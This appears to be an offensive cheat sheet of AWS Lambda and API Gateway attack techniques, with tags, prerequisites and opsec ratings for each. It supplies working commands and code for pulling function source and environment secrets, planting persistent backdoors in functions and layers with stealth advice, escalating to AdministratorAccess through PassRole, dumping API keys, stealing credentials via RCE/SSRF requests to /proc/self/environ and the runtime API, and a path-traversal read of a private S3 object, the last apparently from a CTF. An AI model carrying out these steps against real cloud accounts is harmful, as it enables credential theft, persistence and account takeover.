# AWS Lambda & API Gateway Attack Techniques

> **Pre-req:** `source /opt/venvTools/bin/activate`

### Lambda Source Code Extraction [added: 2026-04]
- **Tags:** #AWS #Lambda #GetFunction #SourceCode #SecretDiscovery #CodeReview #ServerlessRecon
- **Trigger:** Enumerated Lambda functions and have `lambda:GetFunction` permission
- **Prereq:** `lambda:GetFunction` permission + target Lambda function name
- **Yields:** Lambda source code zip (may contain hardcoded credentials, API keys, logic flaws)
- **Opsec:** Low
- **Context:** Have `lambda:GetFunction` — download zip containing source code and env vars
- **Payload/Method:**
  ```bash
  aws lambda list-functions --profile <profile>
  aws lambda get-function --function-name <LAMBDA-NAME> \
    --query 'Code.Location' --output text
  # Output is a pre-signed S3 URL — wget it
  wget -O lambda-function.zip "<url-from-above>"
  unzip lambda-function.zip  # check for hardcoded creds, logic flaws
  ```

### Lambda Environment Variable Exfiltration (Creds via CLI) [added: 2026-04]
- **Tags:** #AWS #Lambda #EnvVars #CredentialHarvest #SecretLeakage #GetFunction #ConfigExfil
- **Trigger:** Enumerated Lambda functions and want to extract secrets stored in environment variables
- **Prereq:** `lambda:GetFunction` permission
- **Yields:** Environment variables containing DB passwords, API keys, secrets, and AWS credentials
- **Opsec:** Low
- **Context:** Have `lambda:GetFunction` — env vars often contain DB passwords, API keys
- **Payload/Method:**
  ```bash
  aws lambda get-function --function-name <NAME>
  # Look for "Environment": {"Variables": {...}} in output
  ```

### Lambda Backdoor via Layer Update (Stealthy Persistence) [added: 2026-04]
- **Tags:** #AWS #Lambda #Layers #Backdoor #Persistence #SupplyChain #StealthyInjection #ServerlessPersistence
- **Trigger:** Need persistent backdoor on Lambda and have layer update permissions (harder to detect than function code changes)
- **Prereq:** `lambda:PublishLayerVersion` + `lambda:ListLayers` + `lambda:GetLayerVersion` permissions
- **Yields:** Persistent backdoor executing on every Lambda invocation that uses the layer, inheriting function's IAM role
- **Opsec:** Low
- **Context:** Have `lambda:UpdateLayerVersion` — backdooring layers is harder to detect than function code changes
- **Payload/Method:**
  ```bash
  # Preferred: update a layer (dependency) instead of function code
  aws lambda list-layers
  aws lambda get-layer-version --layer-name <name> --version-number <ver>
  # Inject backdoor into layer zip
  aws lambda publish-layer-version --layer-name <name> --zip-file fileb://backdoor_layer.zip
  ```

### Lambda Backdoor via Function Code Update [added: 2026-04]
- **Tags:** #AWS #Lambda #UpdateFunctionCode #Backdoor #CodeInjection #Persistence #ServerlessBackdoor
- **Trigger:** Have `lambda:UpdateFunctionCode` permission on a frequently invoked function
- **Prereq:** `lambda:UpdateFunctionCode` permission + target function name
- **Yields:** Code execution on every invocation with the Lambda function's IAM role permissions
- **Opsec:** Med
- **Context:** Have `lambda:UpdateFunctionCode` — every invocation executes your code
- **Payload/Method:**
  ```bash
  aws lambda update-function-code --function-name <function> \
    --zip-file fileb://backdoor.zip
  # Backdoor executes with lambda's IAM role permissions
  ```

### Lambda PrivEsc via PassRole + CreateFunction + Invoke [added: 2026-04]
- **Tags:** #AWS #Lambda #PrivEsc #PassRole #CreateFunction #InvokeFunction #AdminEscalation #ServerlessPrivEsc
- **Trigger:** Have iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction and identified a high-privilege IAM role
- **Prereq:** `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` + existing high-priv IAM role that Lambda can assume
- **Yields:** AdministratorAccess policy attached to your IAM user
- **Opsec:** Med
- **Context:** Have `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction` — create function with high-priv role
- **Payload/Method:**
  ```python
  # privesc_lambda.py — attaches AdministratorAccess to your IAM user
  import boto3
  def lambda_handler(event, context):
      iam = boto3.client('iam')
      iam.attach_user_policy(
          UserName='my_username',
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      return {'statusCode': 200, 'body': 'Pwned'}
  ```
  ```bash
  aws lambda create-function --function-name privesc \
    --runtime python3.9 --role <high_priv_role_arn> \
    --handler privesc_lambda.lambda_handler \
    --zip-file fileb://privesc_lambda.zip
  aws lambda invoke --function-name privesc output.txt
  aws iam list-attached-user-policies --user-name my_username  # verify
  ```

### API Gateway Enumeration → Lambda RCE Discovery [added: 2026-04]
- **Tags:** #AWS #APIGateway #Lambda #Enumeration #RCE #RestAPI #EndpointDiscovery #ServerlessRecon
- **Trigger:** Discovered API Gateway endpoints during recon or have apigateway:* permissions
- **Prereq:** `apigateway:GET` permissions (GetRestApis, GetResources, GetStages, GetApiKeys)
- **Yields:** Exposed API endpoints, stage URLs, API keys, method configurations revealing Lambda invocation targets
- **Opsec:** Low
- **Context:** Find exposed API Gateway endpoints that invoke Lambda functions
- **Payload/Method:**
  ```bash
  # Enumerate APIs
  aws apigateway get-rest-apis
  aws apigateway get-resources --rest-api-id <ID>
  aws apigateway get-stages --rest-api-id <ID>
  aws apigateway get-api-keys --include-values

  # Build invocation URL:
  # https://<API-ID>.execute-api.<REGION>.amazonaws.com/<STAGE>/<RESOURCE>
  curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE

  # Check method policies
  aws apigateway get-method --rest-api-id <ID> --resource-id <RID> --http-method GET
  ```

### Lambda RCE → Credential Exfiltration Chain [added: 2026-04]
- **Tags:** #AWS #Lambda #RCE #CredentialExfil #SSRF #EnvVars #RuntimeAPI #ServerlessExploit
- **Trigger:** Found an API Gateway endpoint that passes user input to system commands or has SSRF
- **Prereq:** RCE or SSRF vulnerability in a Lambda function accessible via API Gateway
- **Yields:** AWS credentials (access key, secret key, session token) from Lambda environment or runtime API
- **Opsec:** Med
- **Context:** API Gateway endpoint executes system commands — escalate to creds
- **Payload/Method:**
  ```
  # Read env vars (may contain AWS_ACCESS_KEY_ID etc.)
  GET /prod/system?cmd=env

  # Or via SSRF to Lambda runtime
  GET /prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/next

  # Or file read
  GET /prod/system?file=/proc/self/environ
  ```

---

### Python os.path.join() Absolute Path Traversal in Lambda [added: 2026-05]
- **Tags:** #Lambda #PathTraversal #PythonOsPathJoin #ServerlessMisconfig #APIGW #S3Read #AbsolutePathBypass #LFI #ServerlessLFI #InputValidation
- **Trigger:** Lambda constructs an S3 key (or file path) using `os.path.join("prefix", user_input)` and only filters `..` — not absolute paths; a second API Gateway endpoint with no schema validation exists alongside the primary validated one; source code available (ZIP download, Lambda source leak, etc.)
- **Prereq:** User-controlled input reaches `os.path.join()` as the second argument; filter checks only for `..`; access to an API Gateway endpoint without request schema validation (look for multiple APIGW IDs in CloudFormation/source); target file path in S3 or filesystem known
- **Yields:** Read of arbitrary S3 objects (or local files) outside the intended prefix; flag, config files, or private templates stored in a separate private bucket
- **Opsec:** Low (appears as normal Lambda invocation; S3 GetObject on the private bucket path)
- **Context:** Python's `os.path.join(a, b)` discards `a` entirely when `b` is an absolute path starting with `/`. A filter checking only for `..` (relative traversal) will miss `template="/flag"` → `os.path.join("templates", "/flag.txt")` → `/flag.txt`. When multiple API Gateways front the same Lambda, the one without schema validation allows arbitrary JSON — use it to send the unvalidated absolute path. Pattern: look for `[APIGW-2]` or a second execute-api endpoint in the source code, CloudFormation stack exports, or error messages.
- **Payload/Method:**
```bash
# Step 1: Identify the unvalidated API Gateway (no schema validation)
# Look in source code/CloudFormation for multiple execute-api endpoints:
grep -r "execute-api" ./source/ 2>/dev/null
# Two GATEWAYs → one has requestValidator/schemaValidation, one does not

# Step 2: Send absolute path as template parameter to bypass filter
# Note: use the APIGW-2 endpoint (no validation)
curl -s -X POST \
  https://<APIGW-2-ID>.execute-api.us-east-1.amazonaws.com/prod/register \
  -H "Content-Type: application/json" \
  -d '{"token":"<valid-token>","template":"/flag","name":"test"}'
# os.path.join("templates", "/flag.txt") → /flag.txt → reads private S3 object

# Step 3: Retrieve output (flag rendered in response body or linked artifact)
# Response may include a card_url — fetch it to get the traversed file contents
CARD_URL=$(curl -s ... | jq -r '.card_url')
curl -s "$CARD_URL"
```
